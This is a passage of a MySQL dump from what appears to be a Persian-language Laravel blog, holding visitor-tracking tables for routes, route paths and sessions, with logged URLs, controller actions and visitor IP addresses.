08:00:01'),(27,31,'slug','تقسیم-نتایج-در-blade-با-استفاده-از-chunks','2017-12-27 08:00:01','2017-12-27 08:00:01'),(28,37,'id','12','2017-12-30 08:32:21','2017-12-30 08:32:21'),(29,38,'id','13','2017-12-30 09:45:22','2017-12-30 09:45:22'),(30,38,'model','blog','2017-12-30 09:45:22','2017-12-30 09:45:22'),(31,41,'comment','3','2018-01-07 01:10:42','2018-01-07 01:10:42'),(32,42,'comment','3','2018-01-07 01:12:31','2018-01-07 01:12:31'),(33,43,'id','2','2018-01-07 06:27:03','2018-01-07 06:27:03'),(34,43,'slug','onvan','2018-01-07 06:27:03','2018-01-07 06:27:03'),(35,49,'role','1','2018-01-09 15:30:32','2018-01-09 15:30:32'),(36,50,'role','1','2018-01-09 15:30:54','2018-01-09 15:30:54'),(37,51,'permission','75','2018-01-09 15:32:09','2018-01-09 15:32:09'),(38,52,'permission','76','2018-01-09 15:32:11','2018-01-09 15:32:11'),(39,53,'permission','76','2018-01-09 15:32:30','2018-01-09 15:32:30');
/*!40000 ALTER TABLE `tracker_route_path_parameters` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_route_paths`
--

DROP TABLE IF EXISTS `tracker_route_paths`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_route_paths` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `route_id` bigint(20) unsigned NOT NULL,
  `path` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tracker_route_paths_route_id_index` (`route_id`),
  KEY `tracker_route_paths_path_index` (`path`),
  KEY `tracker_route_paths_created_at_index` (`created_at`),
  KEY `tracker_route_paths_updated_at_index` (`updated_at`),
  CONSTRAINT `tracker_route_paths_route_id_foreign` FOREIGN KEY (`route_id`) REFERENCES `tracker_routes` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=56 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_route_paths`
--

LOCK TABLES `tracker_route_paths` WRITE;
/*!40000 ALTER TABLE `tracker_route_paths` DISABLE KEYS */;
INSERT INTO `tracker_route_paths` VALUES (1,1,'blogs/14-migration-%DA%86%D8%B7%D9%88%D8%B1-%DB%8C%DA%A9-%DA%A9%D9%84%DB%8C%D8%AF-%D8%AE%D8%A7%D8%B1%D8%AC%DB%8C-%D8%B1%D8%A7-drop-%DA%A9%D9%86%DB%8C%D9%85','2017-12-26 10:50:42','2017-12-26 10:50:42'),(2,2,'admin','2017-12-26 10:51:04','2017-12-26 10:51:04'),(3,3,'_debugbar/assets/stylesheets','2017-12-26 10:53:23','2017-12-26 10:53:23'),(4,4,'_debugbar/assets/javascript','2017-12-26 10:53:23','2017-12-26 10:53:23'),(5,5,'/','2017-12-26 12:07:43','2017-12-26 12:07:43'),(6,6,'test','2017-12-26 12:19:45','2017-12-26 12:19:45'),(7,7,'laravel-filemanager','2017-12-26 12:36:11','2017-12-26 12:36:11'),(8,8,'laravel-filemanager/folders','2017-12-26 12:36:18','2017-12-26 12:36:18'),(9,9,'laravel-filemanager/errors','2017-12-26 12:36:19','2017-12-26 12:36:19'),(10,10,'laravel-filemanager/jsonitems','2017-12-26 12:36:19','2017-12-26 12:36:19'),(11,11,'_debugbar/open','2017-12-26 12:36:20','2017-12-26 12:36:20'),(12,12,'admin/blogs','2017-12-26 12:36:28','2017-12-26 12:36:28'),(13,13,'admin/blogs/14/edit','2017-12-26 12:36:30','2017-12-26 12:36:30'),(14,14,'laravel-filemanager/newfolder','2017-12-26 12:41:25','2017-12-26 12:41:25'),(15,15,'laravel-filemanager/upload','2017-12-26 12:48:23','2017-12-26 12:48:23'),(16,16,'admin/blogs/14','2017-12-26 13:09:45','2017-12-26 13:09:45'),(17,17,'blogs/like/14','2017-12-26 10:06:12','2017-12-26 10:06:12'),(18,18,'logout','2017-12-26 10:18:52','2017-12-26 10:18:52'),(19,1,'blogs/3-%D9%84%D8%A7%D8%B1%D8%A7%D9%88%D9%84-%D8%AF%D9%88-%D8%B1%D8%A7%D9%87-%D8%A8%D8%B1%D8%A7%DB%8C-%D8%AF%D8%B1%D8%AC-%D8%AF%DB%8C%D8%AA%D8%A7%DB%8C-%D9%BE%DB%8C%D8%B4-%D9%81%D8%B1%D8%B6','2017-12-26 10:28:07','2017-12-26 10:28:07'),(20,1,'blogs/4-eloquent-when-%D8%A8%D8%B1%D8%A7%DB%8C-%DA%A9%D9%88%D8%A6%D8%B1%DB%8C-%D9%87%D8%A7%DB%8C-%D9%85%D8%B4%D8%B1%D9%88%D8%B7','2017-12-26 10:28:11','2017-12-26 10:28:11'),(21,1,'blogs/5-%DB%B1%DB%B0-%D8%AA%D8%A7%D8%A8%D8%B9-%DA%A9%D9%85%D8%AA%D8%B1-%D8%B4%D9%86%D8%A7%D8%AE%D8%AA%D9%87-%D8%B4%D8%AF%D9%87-%D8%AF%D8%B1-%D9%84%D8%A7%D8%B1%D8%A7%D9%88%D9%84','2017-12-26 10:28:14','2017-12-26 10:28:14'),(22,1,'blogs/6-eloquent-orm-%D9%88-query-builder-%D8%AF%D8%B1-%D9%84%D8%A7%D8%B1%D8%A7%D9%88%D9%84','2017-12-26 10:28:21','2017-12-26 10:28:21'),(23,19,'blogs','2017-12-26 13:57:21','2017-12-26 13:57:21'),(24,1,'blogs/10-accessors-%D9%88-mutators-%D8%AF%D8%B1-%D9%84%D8%A7%D8%B1%D8%A7%D9%88%D9%84','2017-12-26 17:21:18','2017-12-26 17:21:18'),(25,1,'blogs/9-simplepanigate-%D9%84%D8%A7%D8%B1%D8%A7%D9%88%D9%84-%D9%85%D9%81%DB%8C%D8%AF%D8%AA%D8%B1-%D8%A8%D8%B1%D8%A7%DB%8C-%D8%AF%DB%8C%D8%AA%D8%A7%D9%87%D8%A7%DB%8C-%D8%A8%D8%B2%D8%B1%DA%AF','2017-12-26 17:21:30','2017-12-26 17:21:30'),(26,1,'blogs/1-abstract-classes-interfaces','2017-12-26 20:07:13','2017-12-26 20:07:13'),(27,1,'blogs/7-belongsto-default-models-no-need-to-check-in','2017-12-26 20:07:48','2017-12-26 20:07:48'),(28,1,'blogs/12-%D8%AA%D9%88%D8%A7%D8%A8%D8%B9-has-%D9%88-doesnthave-%D8%AF%D8%B1-eloquent','2017-12-26 20:08:12','2017-12-26 20:08:12'),(29,1,'blogs/11-eloquent-%DA%86%DA%AF%D9%88%D9%86%D9%87-%D9%86%D8%AA%D8%A7%DB%8C%D8%AC-%D8%B1%D8%A7-%D8%A8%D8%A7-mutator-attribute-%D9%85%D8%B1%D8%AA%D8%A8-%DA%A9%D9%86%DB%8C%D9%85','2017-12-27 03:07:53','2017-12-27 03:07:53'),(30,1,'blogs/13-eloquent-%DA%AF%D8%B1%D9%81%D8%AA%D9%86-%D8%A2%D8%AE%D8%B1%DB%8C%D9%86-row-%D8%AF%D8%B1-%DB%8C%DA%A9-relation','2017-12-27 07:59:42','2017-12-27 07:59:42'),(31,1,'blogs/2-%D8%AA%D9%82%D8%B3%DB%8C%D9%85-%D9%86%D8%AA%D8%A7%DB%8C%D8%AC-%D8%AF%D8%B1-blade-%D8%A8%D8%A7-%D8%A7%D8%B3%D8%AA%D9%81%D8%A7%D8%AF%D9%87-%D8%A7%D8%B2-chunks','2017-12-27 08:00:01','2017-12-27 08:00:01'),(32,20,'login','2017-12-27 08:57:35','2017-12-27 08:57:35'),(33,21,'login','2017-12-27 08:57:40','2017-12-27 08:57:40'),(34,22,'admin/educations','2017-12-27 21:28:43','2017-12-27 21:28:43'),(35,23,'admin/settings','2017-12-27 21:28:47','2017-12-27 21:28:47'),(36,24,'admin/skills','2017-12-27 21:33:05','2017-12-27 21:33:05'),(37,17,'blogs/like/12','2017-12-30 08:32:21','2017-12-30 08:32:21'),(38,25,'comments/13/blog','2017-12-30 09:45:22','2017-12-30 09:45:22'),(39,26,'admin/profile','2018-01-05 12:17:59','2018-01-05 12:17:59'),(40,27,'admin/comments','2018-01-07 01:10:31','2018-01-07 01:10:31'),(41,28,'admin/comments/3/edit','2018-01-07 01:10:42','2018-01-07 01:10:42'),(42,29,'admin/comments/3','2018-01-07 01:12:31','2018-01-07 01:12:31'),(43,1,'blogs/2-onvan','2018-01-07 06:27:03','2018-01-07 06:27:03'),(44,30,'admin/export','2018-01-08 05:26:04','2018-01-08 05:26:04'),(45,31,'admin/permissions','2018-01-09 15:29:31','2018-01-09 15:29:31'),(46,32,'admin/permissions/create','2018-01-09 15:29:34','2018-01-09 15:29:34'),(47,33,'admin/permissions','2018-01-09 15:30:17','2018-01-09 15:30:17'),(48,34,'admin/roles','2018-01-09 15:30:29','2018-01-09 15:30:29'),(49,35,'admin/roles/1/edit','2018-01-09 15:30:32','2018-01-09 15:30:32'),(50,36,'admin/roles/1','2018-01-09 15:30:54','2018-01-09 15:30:54'),(51,37,'admin/permissions/75/edit','2018-01-09 15:32:09','2018-01-09 15:32:09'),(52,37,'admin/permissions/76/edit','2018-01-09 15:32:11','2018-01-09 15:32:11'),(53,38,'admin/permissions/76','2018-01-09 15:32:30','2018-01-09 15:32:30'),(54,39,'admin/databases','2018-01-09 15:33:20','2018-01-09 15:33:20'),(55,40,'admin/export','2018-01-09 15:33:57','2018-01-09 15:33:57');
/*!40000 ALTER TABLE `tracker_route_paths` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_routes`
--

DROP TABLE IF EXISTS `tracker_routes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_routes` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `action` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tracker_routes_name_index` (`name`),
  KEY `tracker_routes_action_index` (`action`),
  KEY `tracker_routes_created_at_index` (`created_at`),
  KEY `tracker_routes_updated_at_index` (`updated_at`)
) ENGINE=InnoDB AUTO_INCREMENT=41 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_routes`
--

LOCK TABLES `tracker_routes` WRITE;
/*!40000 ALTER TABLE `tracker_routes` DISABLE KEYS */;
INSERT INTO `tracker_routes` VALUES (1,'blog.show','App\\Http\\Controllers\\RestaurantsController@show','2017-12-26 10:50:42','2017-12-26 10:50:42'),(2,'admin.dashboard.index','App\\Http\\Controllers\\Admin\\DashboardController@index','2017-12-26 10:51:04','2017-12-26 10:51:04'),(3,'debugbar.assets.css','Barryvdh\\Debugbar\\Controllers\\AssetController@css','2017-12-26 10:53:22','2017-12-26 10:53:22'),(4,'debugbar.assets.js','Barryvdh\\Debugbar\\Controllers\\AssetController@js','2017-12-26 10:53:23','2017-12-26 10:53:23'),(5,'site.index','App\\Http\\Controllers\\SiteController@index','2017-12-26 12:07:43','2017-12-26 12:07:43'),(6,'/test','closure','2017-12-26 12:19:45','2017-12-26 12:19:45'),(7,'unisharp.lfm.show','\\Unisharp\\Laravelfilemanager\\controllers\\LfmController@show','2017-12-26 12:36:11','2017-12-26 12:36:11'),(8,'unisharp.lfm.getFolders','\\Unisharp\\Laravelfilemanager\\controllers\\FolderController@getFolders','2017-12-26 12:36:18','2017-12-26 12:36:18'),(9,'unisharp.lfm.getErrors','\\Unisharp\\Laravelfilemanager\\controllers\\LfmController@getErrors','2017-12-26 12:36:19','2017-12-26 12:36:19'),(10,'unisharp.lfm.getItems','\\Unisharp\\Laravelfilemanager\\controllers\\ItemsController@getItems','2017-12-26 12:36:19','2017-12-26 12:36:19'),(11,'debugbar.openhandler','Barryvdh\\Debugbar\\Controllers\\OpenHandlerController@handle','2017-12-26 12:36:20','2017-12-26 12:36:20'),(12,'admin.blogs.index','App\\Http\\Controllers\\Admin\\RestaurantsController@index','2017-12-26 12:36:28','2017-12-26 12:36:28'),(13,'admin.blogs.edit','App\\Http\\Controllers\\Admin\\RestaurantsController@edit','2017-12-26 12:36:30','2017-12-26 12:36:30'),(14,'unisharp.lfm.getAddfolder','\\Unisharp\\Laravelfilemanager\\controllers\\FolderController@getAddfolder','2017-12-26 12:41:25','2017-12-26 12:41:25'),(15,'unisharp.lfm.upload','\\Unisharp\\Laravelfilemanager\\controllers\\UploadController@upload','2017-12-26 12:48:23','2017-12-26 12:48:23'),(16,'admin.blogs.update','App\\Http\\Controllers\\Admin\\RestaurantsController@update','2017-12-26 13:09:45','2017-12-26 13:09:45'),(17,'blog.like','App\\Http\\Controllers\\RestaurantsController@like','2017-12-26 10:06:12','2017-12-26 10:06:12'),(18,'logout','App\\Http\\Controllers\\Auth\\LoginController@logout','2017-12-26 10:18:52','2017-12-26 10:18:52'),(19,'blog.index','App\\Http\\Controllers\\RestaurantsController@index','2017-12-26 13:57:21','2017-12-26 13:57:21'),(20,'login','App\\Http\\Controllers\\Auth\\LoginController@showLoginForm','2017-12-27 08:57:35','2017-12-27 08:57:35'),(21,'/login','App\\Http\\Controllers\\Auth\\LoginController@login','2017-12-27 08:57:40','2017-12-27 08:57:40'),(22,'admin.educations.index','App\\Http\\Controllers\\Admin\\EducationsController@index','2017-12-27 21:28:43','2017-12-27 21:28:43'),(23,'admin.settings.index','App\\Http\\Controllers\\Admin\\SettingsController@index','2017-12-27 21:28:47','2017-12-27 21:28:47'),(24,'admin.skills.index','App\\Http\\Controllers\\Admin\\SkillsController@index','2017-12-27 21:33:05','2017-12-27 21:33:05'),(25,'comment.create','App\\Http\\Controllers\\SiteController@commentCreate','2017-12-30 09:45:22','2017-12-30 09:45:22'),(26,'admin.profile.index','App\\Http\\Controllers\\Admin\\ProfileController@index','2018-01-05 12:17:59','2018-01-05 12:17:59'),(27,'admin.comments.index','App\\Http\\Controllers\\Admin\\CommentsController@index','2018-01-07 01:10:31','2018-01-07 01:10:31'),(28,'admin.comments.edit','App\\Http\\Controllers\\Admin\\CommentsController@edit','2018-01-07 01:10:42','2018-01-07 01:10:42'),(29,'admin.comments.update','App\\Http\\Controllers\\Admin\\CommentsController@update','2018-01-07 01:12:31','2018-01-07 01:12:31'),(30,'admin.dashboard.export','App\\Http\\Controllers\\Admin\\DashboardController@export','2018-01-08 05:26:04','2018-01-08 05:26:04'),(31,'admin.permissions.index','App\\Http\\Controllers\\Admin\\PermissionsController@index','2018-01-09 15:29:31','2018-01-09 15:29:31'),(32,'admin.permissions.create','App\\Http\\Controllers\\Admin\\PermissionsController@create','2018-01-09 15:29:34','2018-01-09 15:29:34'),(33,'admin.permissions.store','App\\Http\\Controllers\\Admin\\PermissionsController@store','2018-01-09 15:30:17','2018-01-09 15:30:17'),(34,'admin.roles.index','App\\Http\\Controllers\\Admin\\RolesController@index','2018-01-09 15:30:29','2018-01-09 15:30:29'),(35,'admin.roles.edit','App\\Http\\Controllers\\Admin\\RolesController@edit','2018-01-09 15:30:32','2018-01-09 15:30:32'),(36,'admin.roles.update','App\\Http\\Controllers\\Admin\\RolesController@update','2018-01-09 15:30:54','2018-01-09 15:30:54'),(37,'admin.permissions.edit','App\\Http\\Controllers\\Admin\\PermissionsController@edit','2018-01-09 15:32:09','2018-01-09 15:32:09'),(38,'admin.permissions.update','App\\Http\\Controllers\\Admin\\PermissionsController@update','2018-01-09 15:32:30','2018-01-09 15:32:30'),(39,'admin.databases.index','App\\Http\\Controllers\\Admin\\DatabasesController@index','2018-01-09 15:33:20','2018-01-09 15:33:20'),(40,'admin.databases.export','App\\Http\\Controllers\\Admin\\DatabasesController@export','2018-01-09 15:33:57','2018-01-09 15:33:57');
/*!40000 ALTER TABLE `tracker_routes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_sessions`
--

DROP TABLE IF EXISTS `tracker_sessions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_sessions` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `uuid` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `user_id` bigint(20) unsigned DEFAULT NULL,
  `device_id` bigint(20) unsigned DEFAULT NULL,
  `agent_id` bigint(20) unsigned DEFAULT NULL,
  `client_ip` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `referer_id` bigint(20) unsigned DEFAULT NULL,
  `cookie_id` bigint(20) unsigned DEFAULT NULL,
  `geoip_id` bigint(20) unsigned DEFAULT NULL,
  `is_robot` tinyint(1) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `language_id` bigint(20) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `tracker_sessions_uuid_unique` (`uuid`),
  KEY `tracker_sessions_user_id_index` (`user_id`),
  KEY `tracker_sessions_device_id_index` (`device_id`),
  KEY `tracker_sessions_agent_id_index` (`agent_id`),
  KEY `tracker_sessions_client_ip_index` (`client_ip`),
  KEY `tracker_sessions_referer_id_index` (`referer_id`),
  KEY `tracker_sessions_cookie_id_index` (`cookie_id`),
  KEY `tracker_sessions_geoip_id_index` (`geoip_id`),
  KEY `tracker_sessions_created_at_index` (`created_at`),
  KEY `tracker_sessions_updated_at_index` (`updated_at`),
  KEY `tracker_sessions_language_id_index` (`language_id`),
  CONSTRAINT `tracker_sessions_agent_id_foreign` FOREIGN KEY (`agent_id`) REFERENCES `tracker_agents` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `tracker_sessions_cookie_id_foreign` FOREIGN KEY (`cookie_id`) REFERENCES `tracker_cookies` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `tracker_sessions_device_id_foreign` FOREIGN KEY (`device_id`) REFERENCES `tracker_devices` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `tracker_sessions_geoip_id_foreign` FOREIGN KEY (`geoip_id`) REFERENCES `tracker_geoip` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `tracker_sessions_language_id_foreign` FOREIGN KEY (`language_id`) REFERENCES `tracker_languages` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `tracker_sessions_referer_id_foreign` FOREIGN KEY (`referer_id`) REFERENCES `tracker_referers` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=789 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_sessions`
--

LOCK TABLES `tracker_sessions` WRITE;
/*!40000 ALTER TABLE `tracker_sessions` DISABLE KEYS */;
INSERT INTO `tracker_sessions` VALUES (1,'fcf78c5f-9fbb-45c6-8491-6ad5c1760718',NULL,1,1,'192.168.10.1',4,NULL,NULL,0,'2017-12-26 13:07:40','2017-12-26 13:07:40',NULL),(2,'e057a300-bdf5-4911-9902-5828459b90d3',NULL,1,1,'192.168.10.1',NULL,NULL,NULL,0,'2017-12-26 11:15:20','2017-12-26 11:15:20',NULL),(3,'62072392-1e0f-4432-a3cc-f4085a7a5535',NULL,1,1,'31.47.32.230',9,NULL,NULL,0,'2017-12-26 13:48:53','2017-12-26 10:18:53',NULL),(4,'cd69fb5e-68dc-42d8-aa1f-ba7ae9777c3d',NULL,5,2,'46.4.0.246',NULL,NULL,NULL,1,'2017-12-26 10:28:07','2017-12-26 10:28:07',NULL),(5,'89807856-9261-4e57-8fc6-0b6a350cc9f4',NULL,5,2,'46.4.0.246',NULL,NULL,NULL,1,'2017-12-26 10:28:11','2017-12-26 10:28:11',NULL),(6,'5a3c85d4-dd2b-4d5a-835f-4d55a716db59',NULL,5,2,'46.4.0.246',NULL,NULL,NULL,1,'2017-12-26 10:28:14','2017-12-26 10:28:14',NULL),(7,'58414145-8a79-411c-b744-1d323f77d45a',NULL,5,2,'46.4.0.246',NULL,NULL,NULL,1,'2017-12-26 10:28:18','2017-12-26 10:28:18',NULL),(8,'c78ca99a-c335-4e51-b61f-9352adffc7cf',NULL,5,2,'46.4.0.246',NULL,NULL,NULL,1,'2017-12-26 10:28:21','2017-12-26 10:28:21',NULL),(9,'1a66511a-1d9d-423f-ad06-458b367b179e',NULL,5,3,'162.210.196.98',NULL,NULL,NULL,1,'2017-12-26 13:46:29','2017-12-26 13:46:29',NULL),(10,'f20aae5f-70fe-488f-9597-e1fdfc36b601',NULL,5,2,'198.204.244.90',NULL,NULL,NULL,1,'2017-12-26 13:57:18','2017-12-26 13:57:18',NULL),(11,'85e22a8f-388e-415c-932c-dadfa16f9d7c',NULL,5,2,'198.204.244.90',NULL,NULL,NULL,1,'2017-12-26 13:57:21','2017-12-26 13:57:21',NULL),(12,'4b9a19a9-2fb2-4416-87bc-e57d51e92e29',NULL,5,2,'198.204.244.90',NULL,NULL,NULL,1,'2017-12-26 13:57:23','2017-12-26 13:57:23',NULL),(13,'230da04f-e697-4881-83af-5236bf0ab507',NULL,5,4,'66.249.75.8',NULL,NULL,NULL,1,'2017-12-26 14:24:03','2017-12-26 14:24:03',NULL),(14,'06fc5667-aad7-4f85-bba0-eef1b6aafee9',NULL,5,5,'117.205.146.174',NULL,NULL,NULL,1,'2017-12-26 15:00:11','2017-12-26 15:00:11',NULL),(15,'cddddc1b-930b-421a-9538-80d49e56807a',NULL,6,6,'162.243.69.215',NULL,NULL,NULL,0,'2017-12-26 15:00:11','2017-12-26 15:00:11',NULL),(16,'e6981a44-ac13-4471-b0ce-c740225102fa',NULL,5,3,'146.52.149.128',NULL,NULL,NULL,1,'2017-12-26 17:21:18','2017-12-26 17:21:18',NULL),(17,'979aa5b7-e8b9-4366-ac60-2910fe859b8b',NULL,5,3,'146.52.149.128',NULL,NULL,NULL,1,'2017-12-26 17:21:21','2017-12-26 17:21:21',NULL),(18,'b3b9a0a1-ee45-4ff0-8142-3c1124f6cb64',NULL,5,3,'146.52.149.128',NULL,NULL,NULL,1,'2017-12-26 17:21:30','2017-12-26 17:21:30',NULL),(19,'10f4eee2-a644-47aa-9e10-4afa1e107b11',NULL,6,7,'91.121.88.41',NULL,NULL,NULL,0,'2017-12-26 19:03:09','2017-12-26 19:03:09',NULL),(20,'e36b19e9-0622-4e81-a4ab-2c551fe86279',NULL,7,8,'52.36.251.200',NULL,NULL,NULL,1,'2017-12-26 23:37:55','2017-12-26 20:07:55',NULL),(21,'620a01ed-9f0c-4703-be8d-1f398d3fc656',NULL,7,8,'52.36.251.200',NULL,NULL,NULL,1,'2017-12-26 23:38:20','2017-12-26 20:08:20',NULL),(22,'46587f3d-3681-4a08-9b07-d9c58fa48470',NULL,6,9,'31.210.186.156',NULL,NULL,NULL,0,'2017-12-26 21:53:42','2017-12-26 21:53:42',NULL),(23,'c4813875-3ed6-42d7-a491-f38893ea651f',NULL,5,3,'5.9.89.170',NULL,NULL,NULL,1,'2017-12-26 23:10:16','2017-12-26 23:10:16',NULL),(24,'645992b4-01ff-49c9-b83c-d36289b44db9',NULL,5,3,'5.9.89.170',NULL,NULL,NULL,1,'2017-12-26 23:10:19','2017-12-26 23:10:19',NULL),(25,'e2870f6c-aee3-4a4b-8b97-583cf95ac4fc',NULL,5,3,'5.9.89.170',NULL,NULL,NULL,1,'2017-12-26 23:10:21','2017-12-26 23:10:21',NULL),(26,'b3d61b57-ccd4-474b-8f21-659db37d1fd8',NULL,6,9,'186.109.242.242',NULL,NULL,NULL,0,'2017-12-26 23:39:42','2017-12-26 23:39:42',NULL),(27,'0a33f4d1-87eb-4715-8a73-81755afe5c20',NULL,5,4,'66.249.75.8',NULL,NULL,NULL,1,'2017-12-27 01:00:14','2017-12-27 01:00:14',NULL),(28,'e28186bc-328e-4439-94ed-822de5ec7c7e',NULL,8,10,'85.185.45.174',NULL,NULL,NULL,0,'2017-12-27 01:11:32','2017-12-27 01:11:32',NULL),(29,'fc369a4e-a8b7-4a51-97e7-b9bcfa45ab2a',NULL,8,10,'85.185.45.174',NULL,NULL,NULL,0,'2017-12-27 01:11:33','2017-12-27 01:11:33',NULL),(30,'1dcf9231-e4ae-4468-ae38-a8974e91a9c5',NULL,9,11,'42.236.10.113',11,NULL,NULL,1,'2017-12-27 02:03:25','2017-12-27 02:03:25',NULL),(31,'86d806c3-1cd2-4b44-871e-708aea7df72f',NULL,9,12,'42.236.10.82',12,NULL,NULL,1,'2017-12-27 02:03:31','2017-12-27 02:03:31',NULL),(32,'5982ba25-828b-4741-95a2-e6f8ce75f777',NULL,5,13,'68.180.229.155',NULL,NULL,NULL,1,'2017-12-27 02:51:14','2017-12-27 02:51:14',NULL),(33,'1b2ec564-2846-4d5d-8b5c-c7392202d384',NULL,10,14,'95.45.252.1',13,NULL,NULL,0,'2017-12-27 03:06:46','2017-12-27 03:06:46',NULL),(34,'63129d7f-2312-4b0c-bf84-38f499e913cd',NULL,10,14,'95.45.252.1',13,NULL,NULL,0,'2017-12-27 03:07:04','2017-12-27 03:07:04',NULL),(35,'e4b9094e-6c8c-48ac-872d-408df3be6fdd',NULL,10,14,'95.45.252.1',13,NULL,NULL,0,'2017-12-27 03:07:23','2017-12-27 03:07:23',NULL),(36,'21e1bac3-ec2b-4556-b4de-0a342e67a1d3',NULL,10,14,'95.45.252.1',13,NULL,NULL,0,'2017-12-27 03:07:31','2017-12-27 03:07:31',NULL),(37,'88f23d74-8b2e-4f2a-a65b-b9c6d24c46b8',NULL,10,14,'95.45.252.1',13,NULL,NULL,0,'2017-12-27 03:07:40','2017-12-27 03:07:40',NULL),(38,'e50d1872-c78b-4e39-92ee-1c4759c85e68',NULL,10,14,'95.45.252.1',13,NULL,NULL,0,'2017-12-27 03:07:53','2017-12-27 03:07:53',NULL),(39,'49a1a698-6f92-421d-bed3-caa229d79ced',NULL,11,15,'2.144.35.38',14,NULL,NULL,0,'2017-12-27 03:45:16','2017-12-27 03:45:16',NULL),(40,'7e29c34f-b303-402b-82b8-4ac1bf25398d',NULL,5,16,'123.125.71.42',NULL,NULL,NULL,1,'2017-12-27 04:25:03','2017-12-27 04:25:03',NULL),(41,'d03283ed-f0c4-48ee-a9c2-935eb46e76ed',NULL,5,17,'5.45.207.45',NULL,NULL,NULL,1,'2017-12-27 04:48:30','2017-12-27 04:48:30',NULL),(42,'6ec2dc71-1b16-41ce-9966-849f4524c2f3',NULL,5,17,'37.9.113.137',NULL,NULL,NULL,1,'2017-12-27 04:49:05','2017-12-27 04:49:05',NULL),(43,'4673ab3e-4b0a-4f53-a382-d49e2b52b0ff',NULL,11,15,'31.29.53.34',15,NULL,NULL,0,'2017-12-27 08:43:27','2017-12-27 05:13:27',NULL),(44,'ff6e1733-32f2-4705-b0c1-443e39be4dd5',NULL,5,18,'40.77.167.34',NULL,NULL,NULL,1,'2017-12-27 06:49:39','2017-12-27 06:49:39',NULL),(45,'4dbfc3a9-bbe4-4620-ab0b-e708cfd66763',NULL,9,11,'42.236.10.85',11,NULL,NULL,1,'2017-12-27 07:06:22','2017-12-27 07:06:22',NULL),(46,'00c9aa63-ed96-4f93-95c6-73203060f9bd',NULL,9,11,'42.236.10.80',12,NULL,NULL,1,'2017-12-27 07:06:22','2017-12-27 07:06:22',NULL),(47,'ebda5879-f207-4863-a5b0-7e6f37d5495b',NULL,5,2,'144.76.115.190',NULL,NULL,NULL,1,'2017-12-27 07:12:57','2017-12-27 07:12:57',NULL),(48,'ea3b97c6-4b92-4394-801b-612feaed9008',NULL,12,19,'66.249.93.88',NULL,NULL,NULL,1,'2017-12-27 07:37:52','2017-12-27 07:37:52',NULL),(49,'e4ac05c5-9170-43f9-8cd6-96aff8e331d3',NULL,5,20,'95.211.190.198',19,NULL,NULL,0,'2017-12-27 11:30:02','2017-12-27 08:00:02',NULL),(50,'bbcab0e7-2e75-4f9d-9867-3f7db63beb94',NULL,6,9,'179.60.243.54',NULL,NULL,NULL,0,'2017-12-27 08:22:21','2017-12-27 08:22:21',NULL),(51,'fe5f6f0a-341a-46f4-93df-1cd0af5542cb',NULL,5,21,'220.181.125.188',NULL,NULL,NULL,1,'2017-12-27 08:28:22','2017-12-27 08:28:22',NULL),(52,'3db0f206-d774-4c33-8695-febeb602ce76',NULL,5,22,'194.187.170.101',NULL,NULL,NULL,1,'2017-12-27 08:46:08','2017-12-27 08:46:08',NULL),(53,'42a33483-c7fc-4422-af10-4e550b22f854',NULL,1,1,'31.47.32.230',21,NULL,NULL,0,'2017-12-27 12:27:48','2017-12-27 08:57:48',NULL),(54,'1a40405d-f3b4-4209-aba6-ed1995b91e5d',NULL,5,3,'162.210.196.129',NULL,NULL,NULL,1,'2017-12-27 11:51:15','2017-12-27 11:51:15',NULL),(55,'595e9311-4cdc-44f7-9c14-ffe43ed58ea0',NULL,9,11,'42.236.46.105',12,NULL,NULL,1,'2017-12-27 14:06:19','2017-12-27 14:06:19',NULL),(56,'2d780782-2fcd-40c2-917c-fc509f436328',NULL,9,11,'42.236.12.150',11,NULL,NULL,1,'2017-12-27 14:06:52','2017-12-27 